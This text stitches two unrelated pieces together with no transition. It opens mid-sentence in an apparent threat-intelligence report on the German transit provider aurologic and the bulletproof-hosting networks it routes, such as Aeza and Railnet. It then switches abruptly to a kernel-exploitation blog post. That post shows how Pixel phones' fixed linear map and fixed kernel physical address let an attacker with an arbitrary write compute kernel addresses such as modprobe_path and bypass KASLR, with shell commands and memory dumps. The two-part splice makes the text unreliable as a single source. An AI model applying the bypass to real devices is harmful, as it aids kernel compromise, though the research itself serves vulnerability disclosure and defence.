(AS216309). Community discussions have further scrutinized aurologic’s ongoing connectivity with Aeza International Ltd, an entity under US sanctions and, more recently, UK sanctions, despite Hofmann’s defense on public forums that Aeza Group LLC was not its “contractual customer.” Hoffman further defended the relationship by emphasizing low abuse volumes, proactive investigations, and compliance with German law. Nevertheless, routing evidence as of writing confirmed that aurologic remained a primary upstream to Aeza International Ltd (AS210644), reinforcing concerns around its continued upstream role.Beyond Aeza, aurologic has also appeared as a transit provider for some of the largest concentrations of suspected threat activity enablers tracked by Insikt Group, including metaspinner net GmbH, Femo IT Solutions Limited, Railnet LLC, Global-Data System IT Corporation, and more. These relationships position the company at the center of ongoing industry debates about infrastructure abuse and due diligence.Infrastructure and Routingaurologic maintains an extensive European interconnection footprint spanning key data centers across Germany, Finland, and the Netherlands. Its infrastructure is anchored in major European internet hubs in both Langen and Amsterdam, where the company maintains direct connections with large colocation facilities. These datacenters serve as central exchange points where networks, content delivery providers, and hosting companies interconnect to exchange traffic efficiently. By maintaining a presence in multiple facilities, aurologic ensures fast, redundant, and high-volume data transit across Europe.This level of connectivity makes aurologic an attractive upstream provider for a range of hosting companies, including those operating in ambiguous or opaque areas of the hosting ecosystem. Whether through technical neutrality, permissive policy, or limited oversight, aurologic’s infrastructure effectively provides a degree of protection and continuity to providers with a reputation for hosting malicious activity. As a result, aurologic sits in a complex position in the hosting landscape, where connectivity and enablement obscure the difference between infrastructure provider and facilitator. This dynamic sets the stage for understanding how aurologic’s network can serve as a foundation for persistent malicious infrastructure and why it plays such a critical role in enabling a broader ecosystem of threat activity.While aurologic’s broad connectivity footprint underpins its strength as a transit provider, it also introduces an enabling function within the threat infrastructure ecosystem. Its combination of network reach, capacity, and perceived permissiveness appears to appeal to questionable hosting providers seeking stable transit relationships that face fewer disruptions from abuse reporting or network-level mitigation efforts. Insikt Group identified more than a dozen TAEs using aurologic for upstream connectivity, ranging from sanctioned entities to self-proclaimed bulletproof hosting providers. The TAEs discussed in this section represent the most significant examples, having displayed some of the highest levels of validated malicious infrastructure within Recorded Future’s Network Intelligence relative to their announced IP space. A full list of active networks analyzed by Recorded Future and linked to aurologic can be found in .Aeza Group is a Russian hosting provider established in 2021 that primarily operates through its UK-registered company, Aeza International Ltd (AS210644). Since its inception, Aeza has become a well-known TAE, enabling cybercriminal and state-aligned operations through resilient, abuse-tolerant infrastructure. At the time of writing, approximately 50% of Aeza International’s announced IP prefixes are routed via aurologic, highlighting its continued dependence on the German provider for upstream connectivity.Insikt Group highlighted Aeza as one of the most prominent sources of validated malicious infrastructure in the Recorded Future 2024 Malicious Infrastructure Report, detailing its role in enabling a range of threats, including ransomware and infostealers, and citing its significant role in the Russian disinformation network Doppelgänger. After the release of Qurium’s Doppelgänger report in July 2024, Aeza revealed in August 2024 that DataCamp Limited (AS60068), a UK-based hosting provider, had terminated its contract, and that, as a result, Aeza partnered with aurologic to continue operations (). Aeza’s continued operations have since prompted law enforcement and regulatory responses from Russia, the United States, and the United Kingdom.A post from “mw” on the forum LowEndTalk quoting Aeza (Source:In April 2025, Russian authorities arrested Aeza Group co-founders Yurii Meruzhanovich Bozoyan and Arsenii Aleksandrovich Penzev on charges related to their alleged involvement in operating the darknet drug marketplace BlackSprut. The arrests followed an April 1 raid by the Federal Security Service (FSB) on Aeza’s Saint Petersburg headquarters, located in the former Wagner PMC Center.Both Bozoyan and Penzev were charged under Articles 210 and 228.1 of the Russian Criminal Code for participation in an organized criminal group and large-scale drug trafficking. Russian media reports described the two as having provided the “technical base” for BlackSprut’s operations, which Aeza hosted through its UK-registered entity, Aeza International Ltd.On July 1, 2025, the US Department of the Treasury’s Office of Foreign Assets Control (OFAC), incoordination with the UK’s National Crime Agency (NCA), sanctioned Aeza Group and its affiliated companies, labeling them a “bulletproof hosting services provider.” OFAC attributed Aeza Group infrastructure to operations involving BianLian ransomware, Lumma and Meduza infostealers, and RedLine Stealer.The list of designated companies includes:Aeza International Ltd (UK branch)Aeza Logistic LLC (Russia-based subsidiary)Cloud Solutions LLC (Russia-based subsidiary)On September 19, 2025, the UK government followed the OFAC action by sanctioning the UK-registered Aeza International Ltd, citing its involvement in “destabilizing Ukraine by providing internet services to Russian disinformation campaigns.” However, at the time of writing, Aeza International remains a legally registered company in the United Kingdom and has yet to be struck off the company register.Despite the arrests of its co-founders and the imposition of sanctions, Aeza has demonstrated a sustained ability to reallocate its infrastructure. Rather than signaling operational decline, these actions appear to have prompted a rapid reorganization of assets aimed at preserving control over key network resources and maintaining service continuity.Within 24 hours of OFAC’s July 2025 sanctions, Insikt Group observed Aeza begin to reallocate its US IP resources to a Serbian organization under the name Smart Digital Ideas DOO, an entity registered mere hours after OFAC announced the sanctions (see ). Insikt Group assessed with high confidence that this was intended to retain control of any assets affected by the OFAC sanctions.RIPE organization record for Smart Digital Ideas (Source:On July 3, 2025, Insikt Group identified the emergence of Hypercore Ltd, a UK-registered company with infrastructure directly linked to Aeza. On July 4, 2025, Hypercore Ltd was re-assigned IP prefix  from Smart Digital Ideas DOO, an allocation which was created only one day prior (see ). 45[.]142[.]122[.]0/24 reallocation to Hypercore Ltd (Source: RIPEstat)On July 7, 2025, Smart Digital Ideas DOO was assigned ASN AS215829 in the RIPE database (see ). Notably, the sponsoring org ORG-AIL64-RIPE was Aeza International Ltd, and the AS object also contains references tracing back to Cloud Solutions LLC.RIPE objects associated with Smart Digital Ideas AS215829 (Source: RIPE)Aeza has remained a prominent source of malicious activity throughout 2025. Based on Recorded Future® Malware Intelligence, Insikt Group identified multiple malware samples exhibiting network connections to AS210644. These samples predominantly included infostealers and remote access trojans (RATs) such as AsyncRAT, Destiny Stealer, Meduza Stealer, REMCOS RAT, Rhadamanthys Stealer, RisePro Stealer, and QuasarRAT.Insikt Group’s recent analysis of the pro-Russian group DDoSia further highlighted Aeza’s continued role in the cybercrime landscape, with Aeza International Ltd (AS210644) accounting for 7.5% of all identified Tier 1 command-and-control (C2) servers between July 2024 and July 2025 (see ). Also of note, other ASs using aurologic’s services collectively accounted for a further 6% of observed C2 infrastructure, while approximately 13.5% of DDoSia Tier 1 C2 IP addresses were announced either directly by aurologic or by ASNs receiving upstream transit from it.Femo IT Solutions LimitedFemo IT Solutions Limited (AS214351) is a UK-incorporated organization that, despite announcing only two  prefixes, has consistently displayed one of the highest concentrations of validated malicious infrastructure relative to its size, according to Recorded Future Network Intelligence. IP addresses announced by Femo IT Solutions hosted C2 infrastructure for Cobalt Strike, DcRat, Rhadamanthys Stealer, TinyLoader, and THC Hydra. Furthermore, Recorded Futures Malware Intelligence highlighted a number of malware samples exhibiting network connections to Femo IT Solutions infrastructure, such as Amadey, Aurotun, QuasarRAT, RedLine Stealer, REMCOS RAT, Stealc, SystemBC, and SvcStealer.Femo IT Solutions' IP prefixes  and  are both routed exclusively via aurologic (see ).Femo IT Solutions routing (Source:IP prefix  is directly controlled by Femo IT Solutions. The prefix was assigned from a larger  block belonging to the Iranian Research Organization for Science and Technology (IROST), a government-controlled body under Iran’s Ministry of Science, Research and Technology. Sub-allocations from this space have also been leveraged by other suspected TAEs tracked by Insikt Group, including Aeza entities Aeza International (AS210644), Hypercore Ltd, and Smart Digital Ideas DOO, as well as Global Connectivity Solutions and Global Internet Solutions (see ).The second announced prefix, , is attributed to New Way LLC, a company registered in Oman. This allocation derives from a  netblock controlled by Iranian internet service provider (ISP) Farahoosh Dena PLC, which offers data center and hosting services. The RIPE object for this range lists contradictory details, including a Philadelphia residential address and an Omani registration ().The network relies exclusively on Aurologic for upstream connectivity and shows clear operational ties to the bulletproof hosting provider Defhost (see ).Defhost emphasizes “fast abusive VPD/VDS” with resilience against takedown efforts by any government, specifically Western law enforcement, and anti-abuse organizations such as “The Spamhaus Project,” while simultaneously assuring customers that its operations will remain uninterrupted. Insikt Group assesses with high confidence that Femo IT Solutions is under the control of Defhost.Global-Data System IT CorporationGlobal-Data System IT Corporation (AS42624), also recognized under the name SWISSNETWORK02, emerged in July 2024 following the transfer of ASN resources from Simple Carrier LLC (). Within just over a year of operation, the network accumulated one of the highest concentrations of malicious activity observed in Recorded Future’s Network Intelligence, ranking within the top ten for malicious activity density as of September 2025. Its infrastructure has hosted a wide range of malware families, including Cobalt Strike, Sliver, QuasarRAT, Remcos Rat, Dark Crystal RAT, Latrodectus, Amadey, and multiple stealer families such as Rhadamanthys, RedLine Stealer, and Meduza.Simple Carrier LLC transferring AS34888 and AS42624 to Global-Data System IT Corporation (Source: RIPE DB)Insikt Group has assessed with medium confidence that Global-Data System IT Corporation is closely tied to PrivateAlps, an offshore privacy-centric hosting provider registered in Switzerland that openly advertises no Know-Your-Customer (KYC) policies, Digital Millennium Copyright Act (DMCA)-ignored hosting, and Tor-friendly infrastructure.Beyond malware hosting, the infrastructure has supported DDoSIA, Socks5Systemz, and other commodity malware ecosystems. It has also been leveraged in targeted campaigns, such as TAG-144’s operations against Latin American governments.All of Global-Data System IT Corporation’s active prefixes are routed solely through aurologic. Routing graphs from September 2025 confirm that all eleven IPv4 prefixes are routed through aurologic, with no diversification, making aurologic the critical enabler of Global-Data System IT Corporation’s reach and resilience.By anchoring its connectivity to a German upstream like aurologic, Global-Data Systems IT Corporation maintains global availability despite repeated associations with malicious infrastructure. Global-Data System IT Corporation’s reliance on a single upstream provider creates a natural single point of failure that could, if interrupted, materially disrupt its operations. The persistence of this arrangement, however, highlights how aurologic’s connectivity enables the network’s reach and suggests permissive or insufficient vetting practices, consistent with patterns observed in other aurologic-linked suspected TAEs such as metaspinner net GmbH and Railnet LLC.Metaspinner net GmbH (AS209800) was a recently registered autonomous system created on April 25, 2025, and was announced exclusively through aurologic (). The name “metaspinner net GmbH” had long since been associated with a legitimate Hamburg-based software company. However, multiple factors indicate that the autonomous system “metaspinner” was not controlled by the same entity, but rather by threat actors likely affiliated with Virtualine Technologies.[UPDATE] As of November 10, 2025, metaspinner net GmbH has provided substantial evidence confirming Insikt Group’s original assessment that their identity was unlawfully and fraudulently used in the registration of AS209800. A falsified RIPE end-user agreement provided to Insikt Group highlights how a basic verification check against publicly accessible company registration documents could have prevented the fraudulent registration. metaspinner net GmbH (Hamburg, Germany) has no affiliation with AS209800, Virtualine Technologies, or any related malicious activity associated with that network.Since its inception, AS209800 has accumulated a substantial malicious footprint. Recorded Future has observed infrastructure within the ASN hosting a wide array of malware families and related tooling, including loaders like TinyLoader and SmokeLoader, information stealers such as Stealc, Amadey, and Phorpiex, and multiple remote access trojans, including AsyncRAT, njRAT, QuasarRAT, Dark Crystal RAT, and REMCOS RAT. Botnets such as Moobot, as well as post-exploitation frameworks like Cobalt Strike, have also been detected. These observations align with Spamhaus, which has recently taken notice of the high volume of suspicious activities appearing from the network within a short timeframe.*: AS209800 appearing downstream from AS30823, aurologic GmbH, on October 3, 2025 (Source: bgp[.]tools)*As of October 3, 2025, AS209800 originated twelve IPv4 prefixes within the ranges , , and . According to RIPE, none of these IPv4 blocks are owned by metaspinner. Instead, they are sub-allocated from a Turkish local internet registry (LIR) MGN Teknoloji Anonim Sirketi, headquartered in Istanbul (). This LIR also sponsors several other suspicious ASNs, all of which were created in 2025 ().*: Visualization of IPv4 prefixes being assigned to metaspinner. (Source: Recorded Future)*
        AS209800’s historical footprint further suggests possible repurposing. AS209800 briefly advertised an IPv6  in December 2020 before going dormant, only to reemerge in 2025 with entirely new IPv4 address spaces and links to MGN Teknoloji. While no official transfer was logged in RIPE, the shift in behavior suggests the ASN was taken over or reallocated, a tactic consistent with other impersonation incidents observed in the same timeframe, such as VSVK Onderhoud B.V. (AS213511).Irregularities are evident in domain registrations. The legitimate software company by the same name, metaspinner, used to operate the domain  and , which over time redirected to its current domain,  (see ). The domain , originally lapsed in the mid-2000s, was re-registered on April 18, 2025, initially through URL Solutions, Inc., and later its record was updated to reflect its registrar as NiceNIC, a registrar known for abuse-tolerant practices.*: The legitimate software company metaspinner net GmbH listed on the US version of* preispiraten[.]de pricepirates[.]com  pricepirates[.]com*: Preispiraten (aka Pricepirates) listed as a service of metaspinner net GmbH on the “Imprint” page (Source:* preispiraten[.]deAt the time of analysis,  was hosted at IP address  which Insikt Group assesses with high confidence to be associated with Virtualine Technologies. Both RIPE and WHOIS data for the domain list a virtual office address in London’s 71-75 Covent Garden, an address previously used by organizations tied to Virtualine Technologies. Historical IP hosting records for  show that  operated on shared infrastructure with domains linked to Virtualine Technologies, such as  and . Historical IP hosting records also show that it shared infrastructure with , a domain once associated with VSVK Onderhoud B.V. (AS213511). Furthermore,  is also hosting four additional suspicious hosting-related domains: , , a, and . More details on the significance of these domains and their connection to Virtualine Technologies are outlined in the next subsections.The name of a legitimate Dutch construction firm, VSVK Onderhoud B.V., was used to register AS213511 on January 27, 2025. The legitimate VSVK Onderhoud operates exclusively in the Netherlands and has no IT or telecommunications business. According to historical WHOIS data, AS213511 was observed having Railnet LLC (AS214943) as its upstream provider. Railnet LLC notably has strong ties to Virtualine Technologies. This observed incident underscores an emerging pattern in AS-level impersonation campaigns, where threat actors may fabricate corporate identities and leverage legitimate-seeming infrastructure to enable phishing and IP hijacking schemes. As of writing, AS213511 is no longer observed on the global routing table.Proxio ( appears to be a newly established proxy service with notable connections to Virtualine Technologies. Proxio has been recently advertised across dark web and underground forums, positioning itself as a high-speed residential or mixed proxy provider. Notably, a forum user operating under the alias “Secury” on BlackHatWorld Forum, with a Virtualine Technologies logo as the profile picture, was observed promoting the Proxio service (see ). This overlap in branding and infrastructure strongly reinforces the likelihood that Proxio and Virtualine Technologies are linked.*: BlackHatWorld user “Secury” advertising Proxio (Source: BlackHatWorld)*Anti-Red Hosting (claims to be providing “Anonymous Anti-Red Bulletproof Hosting,” with its domain registration also listing a virtual office address in London’s Covent Garden.

This shift occurred at the peak of malicious activity on the network, with Recorded Future’s Network Intelligence identifying over 76 validated C2 servers.*: Prefixes once observed under “METASPINNER” (AS209800) are now showing a description of “LANEDONET” as of October 22, 2025 (Source:* *: An example of one of metaspinner’s IPv4 prefixes being reassigned to lanedonet (Source:* Lanedonet Datacenter was registered with RIPE on the same day of the IP prefix transfers from metaspinner, with a listed address of Strawinskylaan 3051 1077 ZX, Amsterdam.

However, its domain, , presents as a German internet service provider (ISP) offering dedicated servers in Germany, the Netherlands, Bulgaria, the United States, and Ukraine.

There is currently only one RIPE resource assigned to Lanedo GmbH at the time of writing, IPv6 prefix .Insikt Group assesses with high confidence that the threat actor(s) behind metaspinner have mirrored their technique of impersonating a legitimate company when setting up , pivoting from metaspinner, as the network had come under increased scrutiny due to its high volume of malicious traffic.Railnet LLC (AS214943) was incorporated in April 2024 and, within its first year of operation, quickly emerged as one of the most abuse-heavy networks tracked by Recorded Future. Infrastructure hosted in Railnet’s space has supported over 30 malware families, including DarkComet, Amadey, Remcos RAT, Latrodectus, Dark Crystal RAT, and commodity stealers such as Rhadamanthys, StealC, Vidar, and Lumma.Railnet is formally registered in Kentucky under an address linked to an organization named Whitelabel Networks LLC, and an incorporation agent tied to several other questionable hosting entities. While Kentucky is not a traditional secrecy jurisdiction, the choice of state and use of mail-drop offices suggest an effort to reduce visibility by avoiding more obvious havens, such as Delaware or offshore jurisdictions.According to routing data observed on August 28, 2025, Railnet originated nineteen IPv4 prefixes, of which approximately 95% are routed via aurologic (), with only a single  range being routed through another German provider, Pfcloud UG.Railnet LLC’s routing through aurologic GmbH as of August 28, 2025 (Source:bgp[.]tools)Railnet’s operational significance lies not just in the malware hosted directly, but in its role enabling multiple bulletproof hosting entities like Virtualine Technologies, DripHosting (DiorHost), and RetryHost.Virtualine Technologies, a Russia-linked bulletproof hoster that openly advertises on Russian-language forums, leases at least fourteen prefixes originated by Railnet (). These prefixes are often registered to various LIRs, which are then announced via Railnet, allowing Virtualine to mask ownership while maintaining operational control. Virtualine’s registration address in London’s 71-75 Covent Garden, a hub for shell entities, has also been associated with other suspected TAEs, including Stark Industries Solutions, Aeza International Ltd, and Global Connectivity Solutions LLC.*: IP sub-allocation from Rapidnet to Virtualine Technologies, routed through Railnet LLC (Source:* Railnet originates multiple prefixes used by DripHosting, a provider that brands itself interchangeably as DiorHost ().

RetryHost explicitly markets itself as “bulletproof,” and overlapping infrastructure suggests close coordination or common backend management between Railnet and RetryHost.*: IP sub-allocation from Telco Power Ltd to RetryHost, routed through Railnet LLC (Source:* These providers collectively demonstrate how Railnet acts as a common backbone for “bulletproof” hosting operations, offering anonymity, routing resilience, and the ability to cycle short-lived leased prefixes to evade detection and blacklisting ().Railnet LLC’s observed prefixes from September 2024 to August 2025 (Source:By carrying the vast majority of Railnet’s traffic, aurologic effectively extends global reach to three separate bulletproof hosting brands that have been consistently tied to malware distribution, botnet infrastructure, and illicit VPS or RDP services. While Railnet’s operators leverage offshore formations, obscure company formations, and prefix cycling to obscure their footprint, the persistence of their upstream relationship with aurologic highlights a broader concern: the enabling role of established European networks in sustaining high-risk or high-abuse infrastructure.As of October 27, 2025, Recorded Futures Network Intelligence observed over 80 validated C2 servers on Railnets AS. This is likely a direct result of originating the twelve IPv4 prefixes transferred from metaspinner to Lanedo Datacenter ().The case with Railnet underscores a recurring theme: aurologic’s upstream connectivity does not appear incidental, but repeatedly visible in the routing paths of various TAEs. Railnet and other TAEs appear highly dependent on aurologic’s permissive transit to maintain continuity despite widespread abuse reporting.The Fine Line Between Neutrality and NegligenceThe persistence of aurologic’s upstream connectivity to multiple suspected TAEs raises a broader question that extends beyond any single provider: To what extent are such relationships the result of negligence, a failure to apply due diligence, as opposed to complicity, where providers knowingly accept or tolerate high-risk customers as a part of their business model? In the context of internet infrastructure, this distinction is critical but often difficult to prove. Transit providers occupy a unique position as gatekeepers of global connectivity. Their willingness or unwillingness to sever ties with abuse-heavy networks directly determines whether malicious infrastructure remains reachable.Negligence in this context often manifests as weak Know-Your-Customer (KYC) procedures, insufficient abuse handling, or a lack of proactive monitoring of downstream announcements. Many upstream networks argue they cannot fully control their downstream customers’ actions and rely on complaints to trigger action or simply redirect any abuse reporting to the customer in question, taking no further action. While aurologic has echoed a similar line of defense, typically directing abuse complaints to its abuse email address, hosting community members have offered anecdotal evidence stating otherwise ().*: LowEndSpirit Forum user “Encoders” describing no responses to abuse complaints (Source:* *: LowEndSpirit user “Treesmokah” pointing out that Hofmann’s Tornado Datacenter had been allegedly raided due to its relationship with Pfcloud UG. (Source:* In June 2024, CORRECTIV, a German non-profit investigative journalism organization, met with aurologic CEO, Joseph Hofmann at his office in Langen to discuss Qurium’s findings that data traffic from Tnsecurity Ltd and other companies in Aeza’s sphere of influence ran through aurologic’s infrastructure, leveraging its connectivity to global internet providers and supporting the Doppelgänger disinformation campaign. Hofmann maintained that he was unaware of any of his customers supporting the campaign, but appeared surprised when shown a link to a fake news article that led to his organization. He argued that this did not constitute definitive proof and insisted that only formal contact from authorities would prompt action. Hofmann describes his situation as a business dilemma, stating, “I can kick everyone out, but then at some point I won’t make any sales,” and that is why he waits for law enforcement correspondence.aurologic’s sustained relationships with multiple TAEs strain the boundaries of plausible negligence. Its continued role in providing upstream transit for Aeza International Ltd, despite US and UK sanctions, suggests a reactive posture focused on legal compliance rather than risk avoidance. Since aurologic operates under German jurisdiction, it may not be violating domestic law. On July 1, 2025, Joseph Hofmann, under the username “jh_aurologic”, publicly defended the company’s position on the LowEndTalk forum (), claiming the customer under review was  Aeza Group LLC. As of this writing, aurologic is not an upstream provider for Aeza Group LLC (AS216246), but remains a major upstream provider for Aeza International Ltd (AS210644).*: aurologic CEO Joseph Hofmann commenting on the situation surrounding Aeza Group LLC (Source:* The distinction between oversight and permissive policy is further blurred by the ease and pace at which fraudulent downstream providers rebrand by leveraging obscure or offshore entities, cycling through prefixes, and establishing new LIRs. This pattern was exemplified in a case documented by Spamhaus, which detailed a now-defunct network of TAEs all operating behind layers of decoy ISPs and ultimately routed through aurologic (see ).*: The Spamhaus Project points out aurologic’s proximity to malicious networks (Source:* X, formerly knows as Twitter)On April 7, 2025, Spamhaus again cited aurologic, describing it as an ISP with a “considerable history of bulletproof hosting proliferation” in relation to its provision of connectivity 49.3 Networking LLC (AS399979). Hofmann publicly disputed the characterization, asserting that the company “has no considerable history of bulletproof hosting” and that employees “react according to applicable law” when receiving abuse reports (see ). In the same thread, Hofmann engaged in a broader discussion with security researcher “Gi7w0rm” regarding aurologic’s continued service to Aeza despite its founders’ arrests and sustained malicious activity. Hoffman outlined his broader stance on maintaining neutrality toward the activity occurring across aurologic’s network, describing neutrality as “the art of being impartial.” This position suggests a broader posture of deliberate non-interference in the name of neutrality, which in practice could explain the persistence of high-risk and abusive networks under aurologic’s infrastructure.*: Joseph Hofmann’s public responses to Spamhaus’ post regarding 49.3 Networking LLC (Source:* X, formerly known as Twitter)From the perspective of impacted victims or network defenders, the difference between negligence and complicity is often meaningless if threat actors are enabled to operate freely. When transit providers like aurologic fail to regularly investigate recurring abuse, whether out of resource constraints, business tolerance, or the legal limitations placed on them, the effect is the same: malicious infrastructure remains globally accessible. Under current EU and German law, transit providers are not generally required to proactively monitor or police customer activity unless they possess actual knowledge of illegal use.aurologic has alluded to strict German data-protection obligations as one of many reasons for avoiding actions such as direct traffic inspection. While that is a legitimate concern, overreliance on that stance can mask operational complacency. The posture is also reflected in the company’s own Terms of Service, which explicitly invoke the EU’s Digital Services Act (DSA) to disclaim liability for content “stored, processed, or transmitted on customer-leased infrastructure,” provided the company is unaware of its existence or does not “actively support illicit use.” Abuse reports are to be verified, forwarded to the customer, and, if unresolved within 24 hours, may result in null-routing of the affected IP address. Only in “rare cases posing higher risks” does aurologic reserve the right to take proactive measures.The company’s public abuse-handling and authority-request policies follow a similar reactive model. All complaints must be submitted via a designated email channel () and include a full evidentiary record. Invalid or incomplete submissions are dismissed automatically. These procedures illustrate how aurologic's operational structure aligns with the reactive, notice-based compliance regime established by the Digitale-Dienste-Gesetz (DDG) and DSA. The company’s obligations begin only once it receives valid notice of abuse, and its enforcement options are further bound by procedural and jurisdictional limits. This framework not only defines but effectively constrains how far a provider can intervene, creating an environment where inaction remains legally defensible even amid persistent abuse. In this sense, aurologic’s abuse handling can be seen as a product of the broader European intermediary-liability model, which tends to prioritize legal defensibility over proactive security stewardship.In practice, this means a provider like aurologic remains compliant with national law even when its network is repeatedly leveraged by threat actors, so long as it can claim lack of awareness of intent. The legal framework effectively absolves transit and hosting providers from responsibility for downstream misuse of their services, allowing malicious infrastructure to persist as long as it operates within the boundaries of plausible deniability.The uncertainty over whether upstream providers are merely negligent or knowingly complicit underscores a central challenge in combating infrastructure abuse. Larger transit providers often defend their practices by citing contractual compliance and legal obligations, yet this narrow framing leaves ample room for high-risk networks to operate undeterred. For the cybersecurity community, regulators, and policymakers, the question is not only whether negligence or permissiveness is at play, but also how to impose accountability when routing decisions repeatedly sustain threat actors engaged in disinformation, cybercrime, and malware distribution.Use Recorded Future Threat Intelligence: Recorded Future customers can proactively mitigate threats originating from malicious networks, such as those discussed in this report, by operationalizing Recorded Future Intelligence Cloud data. This can be achieved by leveraging continuously updated Risk Lists and by blocklisting validated malicious IP addresses to prevent internal communication with malicious infrastructure.Implement Robust Network Security Controls: Configure perimeter security appliances and internal network defenses to block traffic originating from the ASNs identified in this report, unless there is a clearly defined business justification for permitting such traffic.Insikt Group assesses with high confidence that aurologic is likely to remain a central hub for TAE networks. Despite growing public pressure and international sanctions against its downstream customers, aurologic continues to operate within the bounds of its legal obligations, providing upstream connectivity that is ultimately enabling the highest concentrations of malicious activity observed within Recorded Future Network Intelligence. This, combined with the absence of coordinated regulatory enforcement, suggests that the conditions enabling high-risk networks to persist under its infrastructure are unlikely to change.While the exact reason for aurologic’s continued prominence among these networks cannot be confirmed, the company’s public defense of, and ongoing provision of services to, Aeza despite multiple international sanctions, coupled with its publicly stated position of neutrality toward activity on its network, has likely reinforced its reputation among TAEs as a dependable upstream provider.This case also reflects the greater question at hand within the hosting ecosystem: At what point does neutrality or persistent inaction in the face of systemic abuse become indistinguishable from complicity? As long as transit providers are able to maintain legal compliance while continuing to service networks repeatedly associated with malicious activity, the responsibility for intervention remains displaced onto their customers, even when those customers are the source of the abuse. Until these gaps in compliance, accountability, and proactive oversight are addressed, TAEs will continue to thrive.Appendix A: Active Networks Linked to aurologicGlobal-Data System IT Corporation (SWISSNET 02)Femo IT Solutions LimitedVladylsav Naumets (PrivateNetwork.ltd)MXCLOUD Ltd (downstream of WAIcore)IP-Projects GmbH & Co.

# Introduction

I've recently been researching Pixel kernel exploitation and as part of this research I found myself with an excellent arbitrary write primitive…but without a KASLR leak. As necessity is the mother of all invention, on a hunch, I started researching the Linux kernel linear mapping.

# The Linux Linear Mapping

The linear mapping is a region in the kernel virtual address space that is a direct 1:1 unstructured representation of physical memory. Working with Jann, I learned how the kernel decided where to place this region in the virtual address space. To make it possible to analyze kernel internals on a rooted phone, Jann wrote a tool to call tracing BPF's privileged BPF\_FUNC\_probe\_read\_kernel helper, which by design permits arbitrary kernel reads. The code for this is available here. The linear mapping virtual address for a given physical address is calculated by the following macro:

#define phys\_to\_virt(x) ((unsigned long)((x) - PHYS\_OFFSET) \| PAGE\_OFFSET)

On Arm64 PAGE\_OFFSET is simply:

#define VA\_BITS (CONFIG\_ARM64\_VA\_BITS)

#define \_PAGE\_OFFSET(va) (-(UL(1) << (va)))

#define PAGE\_OFFSET (\_PAGE\_OFFSET(VA\_BITS))

As CONFIG\_ARM64\_VA\_BITS is 39 on Android, it’s easy to calculate PAGE\_OFFSET = 0xffffff8000000000.

PHYS\_OFFSET is calculated by:

extern s64 memstart\_addr;

/\\* PHYS\_OFFSET - the physical address of the start of memory. \*/

#define PHYS\_OFFSET ({ VM\_BUG\_ON(memstart\_addr & 1); memstart\_addr; })

memstart\_addr is an exported variable that can be looked up in /proc/kallsyms. Using Jann’s bpf\_arb\_read program, it’s easy to see what this value is:

tokay:/ # grep memstart /proc/kallsyms

ffffffee6d3b2b20 D memstart\_addr

ffffffee6d3f2f80 r \_\_ksymtab\_memstart\_addr

ffffffee6dd86cc8 D memstart\_offset\_seed

tokay:/ # cd /data/local/tmp

tokay:/data/local/tmp # ./bpf\_arb\_read ffffffee6d3b2b20 8 <

ffffffee6d3b2b20 00 00 00 80 00 00 00 00 \|........\|

tokay:/data/local/tmp #

This value (0x80000000) doesn’t look particularly random. In fact, memstart\_addr was theoretically randomized on every boot, but in practice this hasn’t happened for a while on arm64. In fact as of commit 1db780bafa4c it’s no longer even theoretical - virtual address randomization of the linear map is no longer a supported feature in arm64 Linux kernel.

The systemic issue is that memory can (theoretically) be hot plugged in Linux and on Android because of CONFIG\_MEMORY\_HOTPLUG=y. This feature is enabled on Android due to its usage in VM memory sharing. When new memory is plugged into an already running system, it must be possible for the Linux kernel to address this new memory, including adding it onto the linear map. Android on arm64 uses a page size of 4 KiB and 3-level paging, which means virtual addresses in the kernel are limited to 39 bits, unlike typical X86-64 desktops which use 4-level paging and have 48 bits of virtual address space (for kernel and userspace combined); the linear map has to fit within this space further shrinking the area available for it. Given that the maximum amount of theoretical physical memory is far larger than the entire possible linear map region range, the kernel places the linear map at the lowest possible virtual address so it can theoretically be prepared to handle exorbitant (up to 256GB) quantities of hypothetical future hot-plugged physical memory. While it is not technically necessary to choose between memory hot-plugging support and linear map randomization, the Linux kernel developers decided not to invest the engineering effort to implement memory hot-plugging in a way that preserves linear map randomization.

So we now know that PHYS\_OFFSET will always be 0x80000000, and thusly, the phys\_to\_virt calculation becomes purely static - given any physical address, you can calculate the corresponding linear map virtual address by the following formula:

#define phys\_to\_virt(x) ((unsigned long)((x) - 0x80000000) \| 0xffffff8000000000)

# Kernel physical address non-randomization

Compounding this issue, it also happens that on Pixel phones, the bootloader decompresses the kernel itself at the same physical address every boot: 0x80010000.

tokay:/ # grep Kernel /proc/iomem

80010000-81baffff : Kernel code

81fc0000-8225ffff : Kernel data

Theoretically, the bootloader can place the kernel at a random physical address every boot, and many (but not all) other phones, such as the Samsung S25, do this. Unfortunately, Pixel phones are an example of a device that simply decompresses the kernel at a static physical address.

# Calculating static kernel virtual addresses

This means that we can statically calculate a kernel virtual address for any kernel .data entry. Here’s an example of me computing that linear map address for the modprobe\_path string in kernel .data on a Pixel 9:

tokay:/ # grep modprobe\_path /proc/kallsyms

ffffffee6ddf2398 D modprobe\_path

tokay:/ # grep stext /proc/kallsyms

ffffffee6be10000 T \_stext

//Offset from kernel base will be 0xffffffee6ddf2398 - 0xffffffee6be10000 = 0x1fe2398

//Physical address will be 0x80010000 + 0x1fe2398 = 0x81ff2398

//phys\_to\_virt(0x81ff2398) = 0xffffff8001ff2398

tokay:/ # /data/local/tmp/bpf\_arb\_read ffffff8001ff2398 64

ffffff8001ff2398 00 73 79 73 74 65 6d 2f 62 69 6e 2f 6d 6f 64 70 \|.system/bin/modp\|

ffffff8001ff23a8 72 6f 62 65 00 00 00 00 00 00 00 00 00 00 00 00 \|robe............\|

\[ zeroes \]

tokay:/ # reboot sethjenkins@sethjenkins91:~$ adb shell

tokay:/ $ su

tokay:/ # /data/local/tmp/bpf\_arb\_read ffffff8001ff2398 64

ffffff8001ff2398 00 73 79 73 74 65 6d 2f 62 69 6e 2f 6d 6f 64 70 \|.system/bin/modp\|

ffffff8001ff23a8 72 6f 62 65 00 00 00 00 00 00 00 00 00 00 00 00 \|robe............\|

\[ zeroes \]

tokay:/ #

So modprobe\_path will always be accessible at the kernel virtual address 0xffffff8001ff2398, in addition to its normal mapping, even with KASLR enabled. In practice, on Pixel devices you can derive a valid virtual address for a kernel symbol by calculating its offset and simply adding a hardcoded static kernel base address of 0xffffff8000010000. In short, instead of breaking the KASLR slide, it is possible to just use 0xffffff8000010000 as a kernel base instead.

